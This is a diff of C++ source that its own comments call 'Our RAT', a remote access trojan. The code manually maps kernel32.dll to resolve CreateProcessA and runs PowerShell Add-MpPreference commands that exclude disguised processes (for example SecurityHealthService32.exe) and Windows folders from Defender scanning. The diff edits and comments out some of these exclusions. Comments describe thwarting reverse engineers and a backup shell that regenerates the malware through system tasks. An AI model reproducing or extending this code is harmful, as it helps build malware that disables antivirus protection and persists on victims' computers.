@@ -14,22 +14,22 @@ void main() {
 	HANDLE hProc = GetCurrentProcess();
 
     //Don't call LoadLibraryA just because why make life easier for anyone
-	auto pKernel = ManualMap(hProc, FULL_PATH("kernel32.dll"));
-	while (!pKernel) {
-		pKernel = ManualMap(hProc, FULL_PATH("kernel32.dll"));
-	}
-
-	//Uses manual mapped kernel32.dll to call CreateProcessA
-	Powershell powershell((CreateProcessA_t)ResolveFunctionPtr(pKernel, L"CreateProcessA"));
-	//Add exclusions for the Shell, Shell Manager and legitimate process (just to mess with anyone reversing this shit idk)   8================================================D
-	powershell.ExecuteCommand("Add-MpPreference -ExclusionProcess \"SecurityHealthService.exe\"");
-	powershell.ExecuteCommand("Add-MpPreference -ExclusionProcess \"SecurityHealthService32.exe\"");
-	powershell.ExecuteCommand("Add-MpPreference -ExclusionProcess \"SecurityHealthServiceManager.exe\"");
-	//Add exclusion for C:\Windows\System32, where the service will be located, and some random ass folders just to mess with anyone reversing this bad boy
-	powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\System32\"");
-    powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\SysWOW64\"");
-    powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\"");
-    powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\Temp\"");
+    auto pKernel = ManualMap(hProc, FULL_PATH("kernel32.dll"));
+    while (!pKernel) {
+        pKernel = ManualMap(hProc, FULL_PATH("kernel32.dll"));
+    }
+    //Uses manual mapped kernel32.dll to call CreateProcessA
+    Powershell powershell((CreateProcessA_t)ResolveFunctionPtr(pKernel, L"CreateProcessA"));
+    //
+	////Add exclusions for the Shell, Shell Manager and legitimate process (just to mess with anyone reversing this shit idk)   8================================================D
+	//powershell.ExecuteCommand("Add-MpPreference -ExclusionFile \"C:\\Windows\\ServiceProfiles\\LocalService\\SecurityHealthService.exe\"");
+	powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\ServiceProfiles\\LocalService\\SecurityHealthService32.exe\"");
+	powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\ServiceProfiles\\LocalService\\SecurityHealthServiceManager.exe\"");
+	////Add exclusion for C:\Windows\System32, where the service will be located, and some random ass folders just to mess with anyone reversing this bad boy
+	//powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\System32\"");
+    //powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\SysWOW64\"");
+    //powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\"");
+    //powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\Temp\"");
     //Our RAT won't really need Windows folder exclusions since we already excluded the processes, and there's always a backup shell capable of regenerating all its other parts via system Tasks
 
 #ifndef SELF_INJECTION
